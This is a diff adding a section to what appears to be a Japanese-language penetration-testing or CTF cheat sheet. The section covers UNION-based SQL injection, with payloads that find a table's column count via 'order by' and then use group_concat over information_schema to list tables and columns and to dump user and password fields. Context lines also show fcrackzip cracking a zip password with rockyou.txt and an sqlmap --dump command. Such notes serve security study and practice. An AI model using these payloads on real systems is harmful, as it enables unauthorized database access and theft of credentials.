@@ -1390,6 +1390,48 @@ fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt myplace-decoded.backup
 
 [リンク](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-ja-JP.md)
 
+
+### UNION based injection
+
+[記事](https://qiita.com/y-araki-qiita/items/131efa82c4205e83fef8)
+
+[リンク動画](https://www.youtube.com/watch?v=TlTMDw1KD_8)
+
+
+- カラムの数を探す
+
+```
+
+' order by 5 -- &...
+
+5 からincrement/decrement して、エラーから正常動作にうつった時がカラムの数
+
+```
+
+- enumerate
+
+```
+
+ex: カラムの数が2つだった場合
+
+union select 1, order by 5 --　　　このorder by 5 を以下でおきかえる。
+
+
+・ show all tables
+group_concat(table_name,0x0a) from information_schema.tables where table_schema=database()
+
+・ show all columns (update users to the table you are using if it is not called users)
+group_concat(column_name,0x0a) from information_schema.columns where table_name='users'
+
+・ show column data (user and password are the column names and users is the table name)
+group_concat(user, 0x0a, password) from users
+
+
+```
+
+
+### sqlmap
+
 ```
 
 sqlmap -u 'http://localhost:5000/users?name=Alice' --dump
